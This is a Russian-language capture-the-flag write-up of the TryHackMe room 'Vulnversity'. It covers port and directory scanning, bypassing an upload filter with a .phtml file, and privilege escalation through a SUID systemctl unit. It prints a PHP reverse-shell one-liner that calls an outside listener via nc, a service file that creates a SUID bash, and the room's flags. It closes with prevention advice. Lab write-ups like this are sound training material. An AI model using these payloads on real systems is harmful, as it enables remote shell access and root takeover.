# Vulnversity

**Сложность:** Easy

<img width="125" height="100" alt="image" src="https://github.com/user-attachments/assets/40e79827-91f9-4e4d-88a7-68bf00521aa6" />

|  |  |
| --- | --- |
| **Platform** | TryHackMe |
| **Link** | [https://tryhackme.com/r/room/vulnversity](https://tryhackme.com/r/room/vulnversity) |
| **OS** | Linux |
| **Tags** | `file-upload`, `phtml`, `bypass`, `suid`, `systemctl` |

## Кратко

Цепочка атаки: сканирование портов и обнаружение скрытой директории `/internal` → обход ограничений формы загрузки файлов путем смены расширения на `.phtml` → получение reverse shell и поиск пользовательского флага в `/home/bill` → эскалация привилегий до `root` через создание кастомного кастомного юнита `systemctl` с SUID-битом.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV 10.80.147.22

```

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy Squid http proxy 4.10
3333/tcp open  http       Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

По результатам сканирования выявили открытые порты FTP (21), SSH (22), Samba (139/445), Squid proxy (3128) и веб-сервер Apache на порту 3333.

### Перечисление сервисов

Для веб-сервера на порту 3333 запущен перебор директорий с помощью Gobuster:

```bash
gobuster dir -u http://10.80.147.22:3333 -w /usr/share/wordlists/dirb/big.txt -x php

```

```
/css                  (Status: 301) [Size: 317] [--> http://10.80.147.22:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.80.147.22:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.80.147.22:3333/images/]
/internal             (Status: 301) [Size: 322] [--> http://10.80.147.22:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.80.147.22:3333/js/]

```

В ходе перечисления обнаружена ключевая директория `/internal`, содержащая форму загрузки файлов, а также скрытый каталог подгрузки файлов `/internal/uploads`.

## 2. Получение доступа

Форма на странице `/internal` блокирует загрузку файлов `.php`. Фильтрация обойдена переименованием файла в `.phtml`.

Код используемого PHP reverse shell:

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>

```

После загрузки запускаем слушатель `nc -lnvp 8000` и обращаемся к файлу по пути `/internal/uploads/shell.phtml`. Полученный доступ стабилизируем через PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

В директории `/home/bill` находим первый флаг.

**Флаг пользователя:** `8bd7992fbe8a6ad22a63361004cfcedb`

## 3. Повышение привилегий

Поиск бинарников с установленным SUID-битом:

```bash
find / -perm -4000 2>/dev/null

```

```
/bin/systemctl

```

Среди стандартных файлов обнаружена утилита `/bin/systemctl` с SUID-битом. Наличие SUID на `systemctl` позволяет регистрировать и запускать пользовательские службы с правами `root`.

В директории `/tmp` создаем конфигурационный файл службы `rootkit.service`, копирующий `/bin/bash` с установкой SUID-бита:

```bash
cat << 'EOF' > /tmp/rootkit.service
[Unit]
Description=Rootkit Service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"

[Install]
WantedBy=multi-user.target
EOF

```

Создаем ссылку на юнит и запускаем службу через `systemctl`:

```bash
systemctl link /tmp/rootkit.service
systemctl enable --now /tmp/rootkit.service

```

После выполнения службы запускаем созданный бинарник `/tmp/bash -p` без сброса привилегий и получаем root-доступ:

```bash
/tmp/bash -p
# whoami
root
# cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5

```

**Флаг root:** `a58ff8579f0a9270368d33a9966c7fd5`

## Выводы

* **Уязвимости:** Слабо настроенная фильтрация загружаемых файлов (черный список вместо белого), избыточные разрешения на системную утилиту `/bin/systemctl` (SUID-бит).
* **Как предотвратить:** Использовать жесткие белые списки расширений при загрузке файлов, отключать исполнение скриптов в каталоге загрузок (`uploads`), избегать присвоения SUID-битов утилитам управления системными службами.
* **Чему научился:** Способам обхода расширений исполнения PHP через `.phtml` и технике повышения привилегий через создание вредоносных системных юнитов в SUID `systemctl`.

## Использованные инструменты

`nmap`, `gobuster`, `netcat`, `python`, `systemctl`
